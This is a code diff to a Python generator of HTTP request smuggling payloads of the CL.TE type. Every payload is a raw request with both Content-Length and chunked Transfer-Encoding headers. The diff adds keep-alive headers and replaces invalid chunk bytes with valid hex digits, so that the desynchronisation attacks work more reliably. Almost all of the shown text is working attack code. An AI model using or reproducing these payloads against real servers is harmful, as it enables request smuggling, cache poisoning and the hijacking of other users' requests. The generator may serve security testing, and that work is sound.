@@ -63,12 +63,13 @@ class CLTEPayloadGenerator(PayloadGenerator):
             f"POST {path} HTTP/1.1\r\n"
             f"Host: {host}\r\n"
             f"Content-Type: application/x-www-form-urlencoded\r\n"
+            f"Connection: keep-alive\r\n"
             f"Content-Length: 4\r\n"
             f"Transfer-Encoding: chunked\r\n"
             f"\r\n"
             f"1\r\n"
             f"Z\r\n"
-            f"Q"  # This incomplete chunk causes backend to wait
+            f"1"  # Valid hex digit - incomplete chunk causes backend to wait
         )
         
         payloads.append(Payload(
@@ -87,6 +88,7 @@ class CLTEPayloadGenerator(PayloadGenerator):
             f"POST {path} HTTP/1.1\r\n"
             f"Host: {host}\r\n"
             f"Content-Type: application/x-www-form-urlencoded\r\n"
+            f"Connection: keep-alive\r\n"
             f"Content-Length: 6\r\n"
             f"Transfer-Encoding: chunked\r\n"
             f"\r\n"
@@ -110,6 +112,7 @@ class CLTEPayloadGenerator(PayloadGenerator):
         payload3 = (
             f"POST {path} HTTP/1.1\r\n"
             f"Host: {host}\r\n"
+            f"Connection: keep-alive\r\n"
             f"Content-Length: 3\r\n"
             f"Transfer-Encoding: chunked\r\n"
             f"\r\n"
@@ -132,11 +135,12 @@ class CLTEPayloadGenerator(PayloadGenerator):
         payload4 = (
             f"POST {path} HTTP/1.1\r\n"
             f"Host: {host}\r\n"
+            f"Connection: keep-alive\r\n"
             f"Content-Length: 5\r\n"
             f"Transfer-Encoding: chunked\r\n"
             f"\r\n"
             f"ff\r\n"  # Declares 255 bytes but only sends 1
-            f"X"
+            f"1"  # Valid hex digit instead of X
         )
         
         payloads.append(Payload(
@@ -172,6 +176,7 @@ class CLTEPayloadGenerator(PayloadGenerator):
             f"POST {path} HTTP/1.1\r\n"
             f"Host: {host}\r\n"
             f"Content-Type: application/x-www-form-urlencoded\r\n"
+            f"Connection: keep-alive\r\n"
             f"Content-Length: {content_length}\r\n"
             f"Transfer-Encoding: chunked\r\n"
             f"\r\n"
@@ -199,6 +204,7 @@ class CLTEPayloadGenerator(PayloadGenerator):
             f"POST {path} HTTP/1.1\r\n"
             f"Host: {host}\r\n"
             f"Content-Type: application/x-www-form-urlencoded\r\n"
+            f"Connection: keep-alive\r\n"
             f"Content-Length: {cl2}\r\n"
             f"Transfer-Encoding: chunked\r\n"
             f"\r\n"
@@ -226,6 +232,7 @@ class CLTEPayloadGenerator(PayloadGenerator):
             f"POST {path} HTTP/1.1\r\n"
             f"Host: {host}\r\n"
             f"Content-Type: application/x-www-form-urlencoded\r\n"
+            f"Connection: keep-alive\r\n"
             f"Content-Length: {cl3}\r\n"
             f"Transfer-Encoding: chunked\r\n"
             f"\r\n"
@@ -252,6 +259,7 @@ class CLTEPayloadGenerator(PayloadGenerator):
             f"POST {path} HTTP/1.1\r\n"
             f"Host: {host}\r\n"
             f"Content-Type: application/x-www-form-urlencoded\r\n"
+            f"Connection: keep-alive\r\n"
             f"Content-Length: {cl4}\r\n"
             f"Transfer-Encoding: chunked\r\n"
             f"\r\n"
@@ -278,6 +286,7 @@ class CLTEPayloadGenerator(PayloadGenerator):
             f"POST {path} HTTP/1.1\r\n"
             f"Host: {host}\r\n"
             f"Content-Type: application/x-www-form-urlencoded\r\n"
+            f"Connection: keep-alive\r\n"
             f"Content-Length: {cl5}\r\n"
             f"Transfer-Encoding: chunked\r\n"
             f"\r\n"
